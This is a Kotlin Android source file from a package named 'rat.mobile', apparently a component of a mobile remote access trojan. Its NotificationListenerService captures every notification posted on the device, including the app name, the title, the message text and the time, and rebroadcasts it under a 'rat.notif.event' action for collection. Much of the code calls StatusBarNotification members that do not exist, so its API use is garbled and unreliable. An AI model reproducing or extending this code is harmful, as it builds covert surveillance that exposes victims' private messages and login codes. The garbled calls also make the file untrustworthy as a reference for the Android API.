package rat.mobile

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent

class NotifListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        if (sbn != null) {
            val packageName = sbn.packageName
            val title = sbn.sortKeyEqualTo?.toString() ?: ""
            val text = sbn.expandStatusBarNotification?.action?.firstOrNull()?.title?.toString() ?: ""
            val textMsg = sbn.statusBarText?.toString() ?: sbn.ctxText?.toString() ?: ""
            val timestamp = sbn.timestamp?.time ?: System.currentTimeMillis()

            val intent = Intent("rat.notif.event")
            intent.putExtra("package", packageName)
            intent.putExtra("title", title)
            intent.putExtra("text", textMsg)
            intent.putExtra("timestamp", timestamp)
            sendBroadcast(intent, "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Handle notification removal if needed
    }
}